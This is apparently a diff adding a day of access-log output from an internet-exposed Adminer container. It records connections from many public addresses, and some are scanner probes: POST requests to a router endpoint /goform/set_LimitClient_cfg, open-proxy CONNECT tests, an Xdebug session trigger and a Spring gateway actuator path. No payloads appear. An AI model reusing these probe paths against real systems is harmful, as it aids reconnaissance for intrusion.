+[36madminer      |[0m [Wed Jul 10 12:53:14 2024] [::ffff:80.91.157.110]:56611 Closing
+[36madminer      |[0m [Wed Jul 10 13:08:51 2024] [::ffff:87.121.69.27]:40302 Accepted
+[36madminer      |[0m [Wed Jul 10 13:08:51 2024] [::ffff:87.121.69.27]:40302 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 13:08:51 2024] [::ffff:87.121.69.27]:40302 Closing
+[36madminer      |[0m [Wed Jul 10 13:09:51 2024] [::ffff:94.156.10.164]:42240 Accepted
+[36madminer      |[0m [Wed Jul 10 13:09:51 2024] [::ffff:94.156.10.164]:42240 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 13:09:51 2024] [::ffff:94.156.10.164]:42240 Closing
+[36madminer      |[0m [Wed Jul 10 13:18:01 2024] [::ffff:185.224.3.4]:34786 Accepted
+[36madminer      |[0m [Wed Jul 10 13:18:15 2024] [::ffff:185.224.3.4]:33658 Accepted
+[36madminer      |[0m [Wed Jul 10 13:18:28 2024] [::ffff:185.224.3.4]:34786 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 13:18:28 2024] [::ffff:185.224.3.4]:34786 Closing
+[36madminer      |[0m [Wed Jul 10 13:18:34 2024] [::ffff:185.224.3.4]:33658 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 13:18:34 2024] [::ffff:185.224.3.4]:33658 Closing
+[36madminer      |[0m [Wed Jul 10 13:26:24 2024] [::ffff:197.33.224.129]:49480 Accepted
+[36madminer      |[0m [Wed Jul 10 13:26:25 2024] [::ffff:197.33.224.129]:49480 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 13:26:25 2024] [::ffff:197.33.224.129]:49480 Closing
+[36madminer      |[0m [Wed Jul 10 13:26:28 2024] [::ffff:197.33.224.129]:49490 Accepted
+[36madminer      |[0m [Wed Jul 10 13:26:28 2024] [::ffff:197.33.224.129]:49490 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 13:26:28 2024] [::ffff:197.33.224.129]:49490 Closing
+[36madminer      |[0m [Wed Jul 10 13:32:32 2024] [::ffff:80.76.49.131]:56904 Accepted
+[36madminer      |[0m [Wed Jul 10 13:32:32 2024] [::ffff:80.76.49.131]:56904 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 13:32:32 2024] [::ffff:80.76.49.131]:56904 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:40 2024] [::ffff:167.94.145.109]:51212 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:43 2024] [::ffff:167.94.145.109]:51212 Invalid request (Connection reset by peer)
+[36madminer      |[0m [Wed Jul 10 13:58:43 2024] [::ffff:167.94.145.109]:51212 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:43 2024] [::ffff:167.94.145.109]:51630 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:46 2024] [::ffff:167.94.145.109]:51630 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 13:58:46 2024] [::ffff:167.94.145.109]:51630 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:50 2024] [::ffff:167.94.145.109]:51836 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:51 2024] [::ffff:167.94.145.109]:51836 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 13:58:51 2024] [::ffff:167.94.145.109]:51836 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:51 2024] [::ffff:167.94.145.109]:48344 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:51 2024] [::ffff:167.94.145.109]:48344 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 13:58:51 2024] [::ffff:167.94.145.109]:48344 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48366 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48366 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48366 Closing
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48380 Accepted
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48380 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Wed Jul 10 13:58:52 2024] [::ffff:167.94.145.109]:48380 Closing
+[36madminer      |[0m [Wed Jul 10 13:59:39 2024] [::ffff:172.18.0.1]:56320 Accepted
+[36madminer      |[0m [Wed Jul 10 13:59:39 2024] [::ffff:172.18.0.1]:56320 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 13:59:39 2024] [::ffff:172.18.0.1]:56320 Closing
+[36madminer      |[0m [Wed Jul 10 14:17:34 2024] [::ffff:87.121.69.27]:36616 Accepted
+[36madminer      |[0m [Wed Jul 10 14:17:34 2024] [::ffff:87.121.69.27]:36616 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 14:17:34 2024] [::ffff:87.121.69.27]:36616 Closing
+[36madminer      |[0m [Wed Jul 10 14:25:54 2024] [::ffff:68.69.186.202]:58300 Accepted
+[36madminer      |[0m [Wed Jul 10 14:25:54 2024] [::ffff:68.69.186.202]:58300 [200]: CONNECT www.google.com:443
+[36madminer      |[0m [Wed Jul 10 14:25:54 2024] [::ffff:68.69.186.202]:58300 Closing
+[36madminer      |[0m [Wed Jul 10 14:34:50 2024] [::ffff:94.156.10.164]:43880 Accepted
+[36madminer      |[0m [Wed Jul 10 14:34:50 2024] [::ffff:94.156.10.164]:43880 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 14:34:50 2024] [::ffff:94.156.10.164]:43880 Closing
+[36madminer      |[0m [Wed Jul 10 14:35:57 2024] [::ffff:94.156.10.163]:42734 Accepted
+[36madminer      |[0m [Wed Jul 10 14:35:57 2024] [::ffff:94.156.10.163]:42734 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 14:35:57 2024] [::ffff:94.156.10.163]:42734 Closing
+[36madminer      |[0m [Wed Jul 10 14:49:42 2024] [::ffff:151.237.78.207]:56853 Accepted
+[36madminer      |[0m [Wed Jul 10 14:49:42 2024] [::ffff:151.237.78.207]:56853 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 14:49:42 2024] [::ffff:151.237.78.207]:56853 Closing
+[36madminer      |[0m [Wed Jul 10 14:51:51 2024] [::ffff:104.152.52.197]:43105 Accepted
+[36madminer      |[0m [Wed Jul 10 14:51:53 2024] [::ffff:104.152.52.197]:43105 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 14:51:53 2024] [::ffff:104.152.52.197]:43105 Closing
+[36madminer      |[0m [Wed Jul 10 15:35:50 2024] [::ffff:45.156.130.8]:44816 Accepted
+[36madminer      |[0m [Wed Jul 10 15:35:50 2024] [::ffff:45.156.130.8]:44816 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 15:35:50 2024] [::ffff:45.156.130.8]:44816 Closing
+[36madminer      |[0m [Wed Jul 10 15:35:51 2024] [::ffff:45.156.130.8]:44830 Accepted
+[36madminer      |[0m [Wed Jul 10 15:35:51 2024] [::ffff:45.156.130.8]:44830 [200]: GET /console
+[36madminer      |[0m [Wed Jul 10 15:35:51 2024] [::ffff:45.156.130.8]:44830 Closing
+[36madminer      |[0m [Wed Jul 10 15:49:09 2024] [::ffff:87.121.69.27]:45908 Accepted
+[36madminer      |[0m [Wed Jul 10 15:49:09 2024] [::ffff:87.121.69.27]:45908 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 15:49:09 2024] [::ffff:87.121.69.27]:45908 Closing
+[36madminer      |[0m [Wed Jul 10 16:02:34 2024] [::ffff:78.108.177.52]:37974 Accepted
+[36madminer      |[0m [Wed Jul 10 16:02:36 2024] [::ffff:78.108.177.52]:37974 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 16:02:36 2024] [::ffff:78.108.177.52]:37974 Closing
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42122 Accepted
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42122 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42122 Closing
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42130 Accepted
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42130 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 16:39:27 2024] [::ffff:45.164.23.124]:42130 Closing
+[36madminer      |[0m [Wed Jul 10 16:43:53 2024] [::ffff:94.156.10.163]:56052 Accepted
+[36madminer      |[0m [Wed Jul 10 16:43:53 2024] [::ffff:94.156.10.163]:56052 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 16:43:53 2024] [::ffff:94.156.10.163]:56052 Closing
+[36madminer      |[0m [Wed Jul 10 17:08:34 2024] [::ffff:45.156.128.47]:37150 Accepted
+[36madminer      |[0m [Wed Jul 10 17:08:34 2024] [::ffff:45.156.128.47]:37150 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 17:08:34 2024] [::ffff:45.156.128.47]:37150 Closing
+[36madminer      |[0m [Wed Jul 10 17:19:50 2024] [::ffff:94.156.10.163]:56564 Accepted
+[36madminer      |[0m [Wed Jul 10 17:19:50 2024] [::ffff:94.156.10.163]:56564 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 17:19:50 2024] [::ffff:94.156.10.163]:56564 Closing
+[36madminer      |[0m [Wed Jul 10 17:41:59 2024] [::ffff:13.91.41.255]:45854 Accepted
+[36madminer      |[0m [Wed Jul 10 17:42:09 2024] [::ffff:13.91.41.255]:45854 Invalid request (Unexpected EOF)
+[36madminer      |[0m [Wed Jul 10 17:42:09 2024] [::ffff:13.91.41.255]:45854 Closing
+[36madminer      |[0m [Wed Jul 10 18:07:29 2024] [::ffff:94.156.10.164]:56158 Accepted
+[36madminer      |[0m [Wed Jul 10 18:07:29 2024] [::ffff:94.156.10.164]:56158 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 18:07:29 2024] [::ffff:94.156.10.164]:56158 Closing
+[36madminer      |[0m [Wed Jul 10 18:24:04 2024] [::ffff:80.76.49.105]:56668 Accepted
+[36madminer      |[0m [Wed Jul 10 18:24:04 2024] [::ffff:80.76.49.105]:56668 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 18:24:04 2024] [::ffff:80.76.49.105]:56668 Closing
+[36madminer      |[0m [Wed Jul 10 18:28:30 2024] [::ffff:91.238.181.21]:65445 Accepted
+[36madminer      |[0m [Wed Jul 10 18:28:30 2024] [::ffff:91.238.181.21]:65445 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 18:28:30 2024] [::ffff:91.238.181.21]:65445 Closing
+[36madminer      |[0m [Wed Jul 10 18:35:06 2024] [::ffff:87.121.69.27]:53100 Accepted
+[36madminer      |[0m [Wed Jul 10 18:35:06 2024] [::ffff:87.121.69.27]:53100 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 18:35:06 2024] [::ffff:87.121.69.27]:53100 Closing
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:48758 Accepted
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:48758 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:48758 Closing
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:51228 Accepted
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:51228 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:51228 Closing
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:54182 Accepted
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:54182 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 19:18:08 2024] [::ffff:80.66.83.48]:54182 Closing
+[36madminer      |[0m [Wed Jul 10 19:28:23 2024] [::ffff:205.210.31.252]:55911 Accepted
+[36madminer      |[0m [Wed Jul 10 19:28:25 2024] [::ffff:205.210.31.252]:55911 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 19:28:25 2024] [::ffff:205.210.31.252]:55911 Closing
+[36madminer      |[0m [Wed Jul 10 19:37:41 2024] [::ffff:141.98.11.15]:59914 Accepted
+[36madminer      |[0m [Wed Jul 10 19:37:41 2024] [::ffff:141.98.11.15]:59914 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 19:37:41 2024] [::ffff:141.98.11.15]:59914 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:10 2024] [::ffff:165.154.174.108]:38276 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:10 2024] [::ffff:165.154.174.108]:38276 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 19:40:10 2024] [::ffff:165.154.174.108]:38276 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:10 2024] [::ffff:165.154.174.108]:38292 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:38292 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:38292 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33140 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33140 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33140 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33144 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33144 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33144 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33148 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33148 [404]: GET /robots.txt - No such file or directory
+[36madminer      |[0m [Wed Jul 10 19:40:20 2024] [::ffff:165.154.174.108]:33148 Closing
+[36madminer      |[0m [Wed Jul 10 19:40:21 2024] [::ffff:165.154.174.108]:33162 Accepted
+[36madminer      |[0m [Wed Jul 10 19:40:21 2024] [::ffff:165.154.174.108]:33162 [404]: GET /sitemap.xml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 19:40:21 2024] [::ffff:165.154.174.108]:33162 Closing
+[36madminer      |[0m [Wed Jul 10 20:02:03 2024] [::ffff:2.57.149.186]:64436 Accepted
+[36madminer      |[0m [Wed Jul 10 20:02:03 2024] [::ffff:2.57.149.186]:64436 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 20:02:03 2024] [::ffff:2.57.149.186]:64436 Closing
+[36madminer      |[0m [Wed Jul 10 20:07:29 2024] [::ffff:87.121.69.27]:43190 Accepted
+[36madminer      |[0m [Wed Jul 10 20:07:29 2024] [::ffff:87.121.69.27]:43190 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 20:07:29 2024] [::ffff:87.121.69.27]:43190 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:13 2024] [::ffff:167.94.138.37]:38006 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:16 2024] [::ffff:167.94.138.37]:38006 Invalid request (Connection reset by peer)
+[36madminer      |[0m [Wed Jul 10 20:18:16 2024] [::ffff:167.94.138.37]:38006 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:16 2024] [::ffff:167.94.138.37]:38022 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:19 2024] [::ffff:167.94.138.37]:38022 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 20:18:19 2024] [::ffff:167.94.138.37]:38022 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:23 2024] [::ffff:167.94.138.37]:42564 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:24 2024] [::ffff:167.94.138.37]:42564 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 20:18:24 2024] [::ffff:167.94.138.37]:42564 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:24 2024] [::ffff:167.94.138.37]:42566 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:25 2024] [::ffff:167.94.138.37]:42566 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 20:18:25 2024] [::ffff:167.94.138.37]:42566 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:25 2024] [::ffff:167.94.138.37]:42570 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:26 2024] [::ffff:167.94.138.37]:42570 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 20:18:26 2024] [::ffff:167.94.138.37]:42570 Closing
+[36madminer      |[0m [Wed Jul 10 20:18:26 2024] [::ffff:167.94.138.37]:42580 Accepted
+[36madminer      |[0m [Wed Jul 10 20:18:27 2024] [::ffff:167.94.138.37]:42580 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Wed Jul 10 20:18:27 2024] [::ffff:167.94.138.37]:42580 Closing
+[36madminer      |[0m [Wed Jul 10 20:25:30 2024] [::ffff:172.18.0.1]:43812 Accepted
+[36madminer      |[0m [Wed Jul 10 20:25:30 2024] [::ffff:172.18.0.1]:43812 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 20:25:30 2024] [::ffff:172.18.0.1]:43812 Closing
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43816 Accepted
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43816 [200]: GET /?file=default.css&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43816 Closing
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43832 Accepted
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43832 [200]: GET /?file=functions.js&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43832 Closing
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43836 Accepted
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43836 [200]: GET /?file=favicon.ico&version=4.8.1
+[36madminer      |[0m [Wed Jul 10 20:25:31 2024] [::ffff:172.18.0.1]:43836 Closing
+[36madminer      |[0m [Wed Jul 10 20:35:20 2024] [::ffff:83.97.73.245]:39808 Accepted
+[36madminer      |[0m [Wed Jul 10 20:35:20 2024] [::ffff:83.97.73.245]:39808 [200]: GET /?XDEBUG_SESSION_START=phpstorm
+[36madminer      |[0m [Wed Jul 10 20:35:20 2024] [::ffff:83.97.73.245]:39808 Closing
+[36madminer      |[0m [Wed Jul 10 20:37:22 2024] [::ffff:198.235.24.99]:59510 Accepted
+[36madminer      |[0m [Wed Jul 10 20:37:22 2024] [::ffff:198.235.24.99]:59510 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 20:37:22 2024] [::ffff:198.235.24.99]:59510 Closing
+[36madminer      |[0m [Wed Jul 10 20:37:23 2024] [::ffff:198.235.24.99]:59514 Accepted
+[36madminer      |[0m [Wed Jul 10 20:37:23 2024] [::ffff:198.235.24.99]:59514 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 20:37:23 2024] [::ffff:198.235.24.99]:59514 Closing
+[36madminer      |[0m [Wed Jul 10 20:48:35 2024] [::ffff:94.156.10.163]:59678 Accepted
+[36madminer      |[0m [Wed Jul 10 20:48:35 2024] [::ffff:94.156.10.163]:59678 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 20:48:35 2024] [::ffff:94.156.10.163]:59678 Closing
+[36madminer      |[0m [Wed Jul 10 20:50:05 2024] [::ffff:83.97.73.245]:33058 Accepted
+[36madminer      |[0m [Wed Jul 10 20:50:05 2024] [::ffff:83.97.73.245]:33058 [200]: GET /actuator/gateway/routes
+[36madminer      |[0m [Wed Jul 10 20:50:05 2024] [::ffff:83.97.73.245]:33058 Closing
+[36madminer      |[0m [Wed Jul 10 20:57:46 2024] [::ffff:13.64.194.207]:40178 Accepted
+[36madminer      |[0m [Wed Jul 10 20:57:46 2024] [::ffff:13.64.194.207]:40178 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 20:57:46 2024] [::ffff:13.64.194.207]:40178 Closing
+[36madminer      |[0m [Wed Jul 10 21:17:52 2024] [::ffff:94.156.10.163]:37704 Accepted
+[36madminer      |[0m [Wed Jul 10 21:17:52 2024] [::ffff:94.156.10.163]:37704 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 21:17:52 2024] [::ffff:94.156.10.163]:37704 Closing
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:42196 Accepted
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:42196 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:42196 Closing
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:43408 Accepted
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:43408 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:43408 Closing
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:44212 Accepted
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:44212 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 22:21:10 2024] [::ffff:80.66.83.48]:44212 Closing
